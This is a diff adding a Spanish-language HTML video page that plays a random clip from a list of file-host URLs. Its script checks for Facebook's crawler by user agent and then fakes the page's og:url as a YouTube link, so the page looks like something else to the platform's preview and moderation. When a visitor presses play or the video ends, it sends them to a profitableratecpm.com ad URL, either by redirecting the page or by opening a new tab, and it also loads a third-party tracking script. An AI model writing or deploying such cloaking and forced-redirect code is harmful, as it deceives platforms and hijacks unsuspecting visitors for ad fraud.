@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reproducir Video</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000000;
+        }
+        video {
+            max-width: 100%;
+            width: 640px;
+            height: auto;
+        }
+        .fallback-message {
+            display: none;
+            color: red;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <video id="myVideo" controls playsinline>
+        <source id="videoSource" src="" type="video/mp4">
+        Tu navegador no soporta el elemento de video.
+    </video>
+    <div id="fallbackMessage" class="fallback-message">
+        No se pudo abrir el enlace automáticamente. <a href="https://www.profitableratecpm.com/xs6z6q2kc?key=a6a8bcb71172b8142942579fddef81d0" target="_blank">Haz clic aquí para visitar el enlace</a>.
+    </div>
+
+    <script>
+        // Lista de videos
+        const videoList = [
+            "https://qu.ax/csglE.mp4",
+            "https://qu.ax/VBOGK.mp4",
+            "https://qu.ax/VyRBy.mp4",
+            "https://qu.ax/MzuhK.mp4",
+            "https://qu.ax/liZrL.mp4",
+            "https://cdn.videy.co/RUWkifSI1.mp4",
+            "https://cdn.videy.co/mvB5MwJB1.mp4",
+            "https://cdn.videy.co/YbM9ElFw1.mp4",
+            "https://cdn.videy.co/dEjWs9NT1.mp4",
+            "https://cdn.videy.co/nIOFJOOk1.mp4",
+            "https://qu.ax/NQBPn.mp4",
+            "https://cdn.videy.co/myv5RPvW1.mp4?fbclid=IwY2xjawJwQzJleHRuA2FlbQIxMAABHpCfNmxpy9TuDyTaPOVOUQs11-IVb9sysX73RvMwHujkUo6RMZKmaDxcRx1w_aem_aa_C8m76Od3ha5V0K_GDwA",
+            "https://qu.ax/SdoqF.mp4",
+            "https://cdn.videy.co/AFXuMb9K1.mp4",
+            "https://cdn.videy.co/VZvgMSbU1.mp4",
+            "https://cdn.videy.co/QVujXbSx1.mp4",
+            "https://qu.ax/WUvqe.MP4",
+            "https://qu.ax/pRJVi.mp4",
+            "https://cdn.videy.co/9LSfDUP21.mp4",
+            "https://qu.ax/URsAF.mp4"
+        ];
+
+        // Función para detectar bots de Facebook
+        function isFacebookBot() {
+            const botUserAgents = [
+                "facebookexternalhit",
+                "Facebot",
+                "FacebookBot"
+            ];
+            const userAgent = navigator.userAgent.toLowerCase();
+            return botUserAgents.some(bot => userAgent.includes(bot.toLowerCase()));
+        }
+
+        // Función para enmascarar la URL como YouTube
+        function fakeYouTubeURL() {
+            if (isFacebookBot()) {
+                const meta = document.createElement('meta');
+                meta.setAttribute('property', 'og:url');
+                meta.content = "https://www.youtube.com/watch?v=9o4kvBI5A98&list=RD2oX2FSv4Rys&index=6";
+                document.head.appendChild(meta);
+            }
+        }
+
+        // Seleccionar un video aleatorio
+        function selectRandomVideo() {
+            const randomIndex = Math.floor(Math.random() * videoList.length);
+            return videoList[randomIndex];
+        }
+
+        // Configurar el video
+        const video = document.getElementById("myVideo");
+        const videoSource = document.getElementById("videoSource");
+        const fallbackMessage = document.getElementById("fallbackMessage");
+        let hasRedirectedOnPlay = false;
+
+        // Asignar video aleatorio
+        videoSource.src = selectRandomVideo();
+        video.load(); // Recargar el video con la nueva fuente
+
+        // Detectar si es un dispositivo iOS
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        // Abrir enlace o redirigir al iniciar la reproducción
+        video.addEventListener("play", function() {
+            if (!hasRedirectedOnPlay) {
+                hasRedirectedOnPlay = true;
+                if (isIOS) {
+                    // En iOS, redirigir la página actual
+                    window.location.href = "https://www.profitableratecpm.com/xs6z6q2kc?key=a6a8bcb71172b8142942579fddef81d0";
+                } else {
+                    // En Android, Windows, Mac, abrir en nueva pestaña
+                    setTimeout(() => {
+                        const newWindow = window.open("https://www.profitableratecpm.com/xs6z6q2kc?key=a6a8bcb71172b8142942579fddef81d0", "_blank");
+                        if (!newWindow || newWindow.closed || typeof newWindow.closed === "undefined") {
+                            // Si window.open falla, mostrar mensaje fallback
+                            fallbackMessage.style.display = "block";
+                        }
+                    }, 100); // Pequeño retraso para compatibilidad
+                    // No pausamos el video, permitiendo que continúe
+                }
+            }
+        });
+
+        // Redirigir al finalizar el video (todos los dispositivos)
+        video.addEventListener("ended", function() {
+            window.location.href = "https://www.profitableratecpm.com/xs6z6q2kc?key=a6a8bcb71172b8142942579fddef81d0";
+        });
+
+        // Manejar errores de carga del video
+        video.addEventListener("error", function(e) {
+            alert("Error al cargar el video. Por favor, verifica que los archivos de video estén disponibles y sean compatibles.");
+            console.error("Error de video:", e);
+        });
+
+        // Forzar la reproducción en línea en iOS
+        video.setAttribute("playsinline", true);
+
+        // Ejecutar la función para enmascarar la URL al cargar la página
+        window.onload = fakeYouTubeURL;
+
+        // Script adicional
+        var _wau = _wau || []; _wau.push(["tab", "1w0rooukct", "r4y", "left-upper"]);
+    </script>
+    <script async src="//waust.at/t.js"></script>
+</body>
+</html>
